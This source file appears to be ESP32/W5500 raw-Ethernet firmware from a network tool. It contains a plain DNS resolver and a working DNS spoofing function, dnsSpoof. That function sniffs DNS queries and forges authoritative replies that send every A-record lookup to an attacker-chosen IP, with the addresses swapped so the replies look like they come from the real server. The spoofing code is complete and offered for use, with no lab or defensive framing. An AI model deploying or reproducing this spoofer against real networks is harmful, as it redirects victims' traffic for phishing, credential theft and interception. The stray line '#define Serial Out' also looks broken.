#include "dns_tool.h"
#include "../include/config.h"
#include "net_util.h"
#include "packet.h"
#include "weblog.h"
#include <string.h>

#define Serial Out

// =============================================================================
// Constants
// =============================================================================
#define ETHERTYPE_IPV4  0x0800
#define IPPROTO_UDP     17
#define DNS_PORT        53

// DNS header flags
#define DNS_FLAG_QR     0x8000   // Response
#define DNS_FLAG_AA     0x0400   // Authoritative
#define DNS_FLAG_RD     0x0100   // Recursion desired
#define DNS_FLAG_RA     0x0080   // Recursion available
#define DNS_RCODE_OK    0x0000
#define DNS_TYPE_A      1
#define DNS_CLASS_IN    1

// =============================================================================
// Static helpers
// =============================================================================

// Encode a dotted hostname into DNS wire format (length-prefixed labels).
// Returns bytes written, or 0 on error.
static uint16_t dnsEncodeName(uint8_t *dst, uint16_t cap, const char *name)
{
    uint16_t pos = 0;
    const char *p = name;
    while (*p) {
        const char *dot = strchr(p, '.');
        uint8_t len = dot ? (uint8_t)(dot - p) : (uint8_t)strlen(p);
        if (len == 0 || len > 63 || pos + 1 + len >= cap) return 0;
        dst[pos++] = len;
        memcpy(dst + pos, p, len);
        pos += len;
        p += len;
        if (*p == '.') p++;
    }
    if (pos + 1 >= cap) return 0;
    dst[pos++] = 0; // root label
    return pos;
}

// Build a minimal IPv4/UDP frame header. Returns offset to UDP payload start.
static uint16_t buildUdpIpv4(uint8_t *f, const uint8_t dstMac[6],
                             const uint8_t srcMac[6], uint32_t srcIp,
                             uint32_t dstIp, uint16_t srcPort,
                             uint16_t dstPort, uint16_t udpPayloadLen)
{
    // Ethernet header
    memcpy(f, dstMac, 6);
    memcpy(f + 6, srcMac, 6);
    put16(f + 12, ETHERTYPE_IPV4);

    // IPv4 header (20 bytes, no options)
    uint8_t *ip = f + 14;
    uint16_t totalLen = 20 + 8 + udpPayloadLen; // IP hdr + UDP hdr + payload
    ip[0] = 0x45;           // ver=4, IHL=5
    ip[1] = 0x00;           // DSCP/ECN
    put16(ip + 2, totalLen);
    put16(ip + 4, (uint16_t)(esp_random() & 0xFFFF)); // ID
    put16(ip + 6, 0x4000);  // DF
    ip[8] = 64;             // TTL
    ip[9] = IPPROTO_UDP;
    put16(ip + 10, 0);      // checksum placeholder
    put32(ip + 12, srcIp);
    put32(ip + 16, dstIp);
    // IP checksum
    put16(ip + 10, inetChecksum(ip, 20));

    // UDP header
    uint8_t *udp = ip + 20;
    put16(udp + 0, srcPort);
    put16(udp + 2, dstPort);
    put16(udp + 4, 8 + udpPayloadLen);
    put16(udp + 6, 0); // checksum optional for IPv4

    return 14 + 20 + 8; // offset to payload
}

// =============================================================================
// dnsResolve -- unicast DNS A-record query
// =============================================================================
uint32_t dnsResolve(W5500Raw &eth, IpStack &ip, const char *hostname,
                    uint32_t dnsServer, uint32_t timeoutMs)
{
    if (!hostname || !*hostname) {
        Serial.println("[dns] No hostname specified.");
        return 0;
    }
    if (ip.ip() == 0) {
        Serial.println("[dns] No IP configured. Run 'ip dhcp' or 'ip static' first.");
        return 0;
    }
    if (dnsServer == 0) dnsServer = ip.gw();
    if (dnsServer == 0) {
        Serial.println("[dns] No DNS server or gateway configured.");
        return 0;
    }

    // Build DNS query
    uint8_t qbuf[128];
    uint16_t qpos = 0;
    uint16_t txid = (uint16_t)(esp_random() & 0xFFFF);
    put16(qbuf + qpos, txid);         qpos += 2; // Transaction ID
    put16(qbuf + qpos, DNS_FLAG_RD);  qpos += 2; // Flags: standard query, RD
    put16(qbuf + qpos, 1);            qpos += 2; // QDCOUNT
    put16(qbuf + qpos, 0);            qpos += 2; // ANCOUNT
    put16(qbuf + qpos, 0);            qpos += 2; // NSCOUNT
    put16(qbuf + qpos, 0);            qpos += 2; // ARCOUNT

    uint16_t nameLen = dnsEncodeName(qbuf + qpos, sizeof(qbuf) - qpos - 4, hostname);
    if (nameLen == 0) {
        Serial.println("[dns] Hostname too long or invalid.");
        return 0;
    }
    qpos += nameLen;
    put16(qbuf + qpos, DNS_TYPE_A);   qpos += 2; // QTYPE
    put16(qbuf + qpos, DNS_CLASS_IN); qpos += 2; // QCLASS

    // We need to ARP-resolve the DNS server (or gateway) first. Use broadcast
    // as a simple fallback if not on the same subnet.
    uint8_t dstMac[6];
    bool onLink = ((ip.ip() ^ dnsServer) & ip.mask()) == 0;
    uint32_t nexthop = onLink ? dnsServer : ip.gw();
    // Send ARP request for nexthop
    {
        uint8_t arp[42];
        memcpy(arp, "\xff\xff\xff\xff\xff\xff", 6);
        memcpy(arp + 6, ip.mac(), 6);
        put16(arp + 12, 0x0806);
        put16(arp + 14, 1); put16(arp + 16, 0x0800);
        arp[18] = 6; arp[19] = 4;
        put16(arp + 20, 1); // ARP request
        memcpy(arp + 22, ip.mac(), 6);
        put32(arp + 28, ip.ip());
        memset(arp + 32, 0, 6);
        put32(arp + 38, nexthop);
        eth.sendFrame(arp, 42);
    }
    // Wait for ARP reply
    bool resolved = false;
    uint32_t t0 = millis();
    while (millis() - t0 < 2000) {
        uint8_t rxbuf[128];
        uint16_t len = eth.recvFrame(rxbuf, sizeof(rxbuf));
        if (len >= 42 && get16(rxbuf + 12) == 0x0806 && get16(rxbuf + 20) == 2) {
            if (get32(rxbuf + 28) == nexthop) {
                memcpy(dstMac, rxbuf + 22, 6);
                resolved = true;
                break;
            }
        }
        delay(1);
    }
    if (!resolved) {
        // Fallback: broadcast
        memset(dstMac, 0xFF, 6);
    }

    // Build and send DNS query frame
    uint8_t frame[256];
    uint16_t srcPort = 1024 + (esp_random() % 60000);
    uint16_t off = buildUdpIpv4(frame, dstMac, ip.mac(), ip.ip(), dnsServer,
                                srcPort, DNS_PORT, qpos);
    memcpy(frame + off, qbuf, qpos);
    uint16_t frameLen = off + qpos;
    if (frameLen < 60) frameLen = 60;

    eth.sendFrame(frame, frameLen);
    Serial.printf("[dns] Query sent for '%s' -> %u.%u.%u.%u\r\n", hostname,
                  (dnsServer >> 24) & 0xFF, (dnsServer >> 16) & 0xFF,
                  (dnsServer >> 8) & 0xFF, dnsServer & 0xFF);

    // Wait for response
    t0 = millis();
    while (millis() - t0 < timeoutMs) {
        uint8_t rxbuf[512];
        uint16_t len = eth.recvFrame(rxbuf, sizeof(rxbuf));
        if (len < 14 + 20 + 8 + 12) { delay(1); continue; }
        if (get16(rxbuf + 12) != ETHERTYPE_IPV4) continue;
        uint8_t *ipH = rxbuf + 14;
        if (ipH[9] != IPPROTO_UDP) continue;
        uint8_t *udp = ipH + (ipH[0] & 0x0F) * 4;
        if (get16(udp + 0) != DNS_PORT) continue;
        uint8_t *dns = udp + 8;
        uint16_t rlen = len - (dns - rxbuf);
        if (rlen < 12) continue;
        if (get16(dns) != txid) continue;
        uint16_t flags = get16(dns + 2);
        if (!(flags & DNS_FLAG_QR)) continue; // not a response

        uint16_t anCount = get16(dns + 6);
        uint8_t rcode = flags & 0x0F;
        if (rcode != 0) {
            Serial.printf("[dns] Response RCODE=%u (", rcode);
            switch (rcode) {
                case 1: Serial.print("FORMERR"); break;
                case 2: Serial.print("SERVFAIL"); break;
                case 3: Serial.print("NXDOMAIN"); break;
                case 5: Serial.print("REFUSED"); break;
                default: Serial.print("OTHER"); break;
            }
            Serial.println(")");
            return 0;
        }
        if (anCount == 0) { Serial.println("[dns] No answers."); return 0; }

        // Skip question section
        uint16_t pos = 12;
        for (uint16_t q = 0; q < get16(dns + 4) && pos < rlen; q++) {
            while (pos < rlen && dns[pos] != 0) {
                if ((dns[pos] & 0xC0) == 0xC0) { pos += 2; goto qskip; }
                pos += 1 + dns[pos];
            }
            pos++; // null terminator
            qskip: pos += 4; // QTYPE + QCLASS
        }

        // Parse answers
        for (uint16_t a = 0; a < anCount && pos + 12 <= rlen; a++) {
            // Skip name (may be pointer)
            if ((dns[pos] & 0xC0) == 0xC0) pos += 2;
            else { while (pos < rlen && dns[pos] != 0) pos += 1 + dns[pos]; pos++; }
            uint16_t rtype = get16(dns + pos);
            uint16_t rdlen = get16(dns + pos + 8);
            pos += 10;
            if (rtype == DNS_TYPE_A && rdlen == 4 && pos + 4 <= rlen) {
                uint32_t result = get32(dns + pos);
                char rstr[16]; ipToStr(result, rstr);
                Serial.printf("[dns] %s -> %s (TTL %u)\r\n", hostname, rstr,
                              (unsigned)get32(dns + pos - 6));
                return result;
            }
            pos += rdlen;
        }
        Serial.println("[dns] No A record in response.");
        return 0;
    }

    Serial.println("[dns] Timeout -- no response.");
    return 0;
}

// =============================================================================
// dnsSpoof -- rogue DNS responder (answers queries with spoofIp)
// =============================================================================
uint32_t dnsSpoof(W5500Raw &eth, const uint8_t srcMac[6], uint32_t spoofIp,
                  uint32_t seconds)
{
    char ipS[16]; ipToStr(spoofIp, ipS);
    Serial.printf("[dns-spoof] Spoofing DNS replies -> %s for %lu s (press key to stop)\r\n",
                  ipS, (unsigned long)seconds);

    uint32_t count = 0;
    uint32_t t0 = millis();
    while (millis() - t0 < seconds * 1000UL) {
        if (Serial.available()) { Serial.read(); break; }

        uint8_t rxbuf[512];
        uint16_t len = eth.recvFrame(rxbuf, sizeof(rxbuf));
        if (len < 14 + 20 + 8 + 12) { delay(1); continue; }
        if (get16(rxbuf + 12) != ETHERTYPE_IPV4) continue;
        uint8_t *ipH = rxbuf + 14;
        if (ipH[9] != IPPROTO_UDP) continue;
        uint8_t ihl = (ipH[0] & 0x0F) * 4;
        uint8_t *udp = ipH + ihl;
        if (get16(udp + 2) != DNS_PORT) continue; // dst port != 53

        uint8_t *dns = udp + 8;
        uint16_t dnsLen = len - (dns - rxbuf);
        if (dnsLen < 12) continue;
        uint16_t flags = get16(dns + 2);
        if (flags & DNS_FLAG_QR) continue; // already a response
        uint16_t qdCount = get16(dns + 4);
        if (qdCount == 0) continue;

        // Extract queried name for logging
        uint16_t qpos = 12;
        char qname[128] = {0};
        uint16_t qi = 0;
        while (qpos < dnsLen && dns[qpos] != 0 && qi < sizeof(qname) - 2) {
            uint8_t ll = dns[qpos++];
            if ((ll & 0xC0) == 0xC0) { qpos++; break; }
            if (qi > 0) qname[qi++] = '.';
            for (uint8_t i = 0; i < ll && qpos < dnsLen && qi < sizeof(qname) - 1; i++)
                qname[qi++] = (char)dns[qpos++];
        }
        if (dns[qpos] == 0) qpos++;
        qname[qi] = '\0';

        // Check QTYPE == A (1) and QCLASS == IN (1)
        if (qpos + 4 > dnsLen) continue;
        uint16_t qtype = get16(dns + qpos);
        qpos += 4; // skip QTYPE + QCLASS
        if (qtype != DNS_TYPE_A) continue;

        // Build spoofed DNS response
        uint8_t resp[512];
        // Start with the original query, flip QR bit, set answer count
        uint16_t respDnsLen = dnsLen;
        if (respDnsLen > sizeof(resp) - 14 - 20 - 8 - 16) continue;
        memcpy(resp + 14 + 20 + 8, dns, dnsLen);
        uint8_t *rdns = resp + 14 + 20 + 8;
        put16(rdns + 2, DNS_FLAG_QR | DNS_FLAG_AA | DNS_FLAG_RA | (flags & DNS_FLAG_RD));
        put16(rdns + 6, 1); // ANCOUNT = 1

        // Append answer: pointer to name + TYPE A + CLASS IN + TTL + RDLENGTH + IP
        uint16_t ansOff = dnsLen;
        rdns[ansOff++] = 0xC0; rdns[ansOff++] = 12; // name pointer to question
        put16(rdns + ansOff, DNS_TYPE_A);   ansOff += 2;
        put16(rdns + ansOff, DNS_CLASS_IN); ansOff += 2;
        put32(rdns + ansOff, 300);          ansOff += 4; // TTL
        put16(rdns + ansOff, 4);            ansOff += 2; // RDLENGTH
        put32(rdns + ansOff, spoofIp);      ansOff += 4;
        respDnsLen = ansOff;

        // Build Ethernet + IPv4 + UDP wrapper (swap src/dst)
        uint32_t origSrcIp = get32(ipH + 12);
        uint32_t origDstIp = get32(ipH + 16);
        uint16_t origSrcPort = get16(udp + 0);
        buildUdpIpv4(resp, rxbuf + 6, srcMac, origDstIp, origSrcIp,
                     DNS_PORT, origSrcPort, respDnsLen);
        uint16_t frameLen = 14 + 20 + 8 + respDnsLen;
        if (frameLen < 60) frameLen = 60;
        eth.sendFrame(resp, frameLen);
        count++;

        Serial.printf("[dns-spoof] Answered: %s -> %s\r\n", qname, ipS);
    }

    Serial.printf("[dns-spoof] Done. Answered %lu queries.\r\n", (unsigned long)count);
    return count;
}
